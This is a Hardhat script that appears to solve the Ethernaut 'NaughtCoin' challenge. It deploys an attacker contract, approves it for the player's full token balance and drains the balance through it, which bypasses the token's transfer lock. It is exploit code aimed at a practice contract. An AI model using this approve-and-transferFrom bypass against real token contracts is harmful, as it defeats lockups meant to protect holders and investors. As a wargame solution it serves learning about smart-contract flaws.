const { ethers } = require("hardhat");

const NAUGHTCOIN_CONTRACT_NAME = "NaughtCoin";
const NAUGHTCOIN_CONTRACT_ADDRESS = "0x53a4281C1B6Cd5A1AEb2963b292C54068610bE45";
const ATTACKER_NAUGHTCOIN_CONTRACT_NAME = "NaughtCoin_Attacker";

async function main() {
    const [user] = await ethers.getSigners();

    const naughtCoinFactory = await ethers.getContractFactory(NAUGHTCOIN_CONTRACT_NAME);
    const naughtCoinContract = naughtCoinFactory.attach(NAUGHTCOIN_CONTRACT_ADDRESS);

    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAUGHTCOIN_CONTRACT_NAME);
    const attackerContract = await attackerFactory.deploy(naughtCoinContract.address);
    await attackerContract.deployed();

    const ATTACKER_NAUGHTCOIN_CONTRACT_ADDRESS = attackerContract.address;
    console.log("Attacker Contract deployed at: ", attackerContract.address);

    console.log("Balance of Player Before Approval: ", await naughtCoinContract.balanceOf(user.address));
    console.log("Allowance for Attacker Before Approval: ", await naughtCoinContract.allowance(user.address, attackerContract.address));

    const approvalTx = await naughtCoinContract.approve(attackerContract.address, await naughtCoinContract.balanceOf(user.address));
    await approvalTx.wait();

    console.log("Allowance for Attacker After Approval: ", await naughtCoinContract.allowance(user.address, attackerContract.address));

    const transferTx = await attackerContract.transferAttacker(user.address, attackerContract.address);
    await transferTx.wait();

    console.log("Balance of Player After Transfer: ", await naughtCoinContract.balanceOf(user.address));
    console.log("Balance of Attacker After Transfer: ", await naughtCoinContract.balanceOf(attackerContract.address));
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})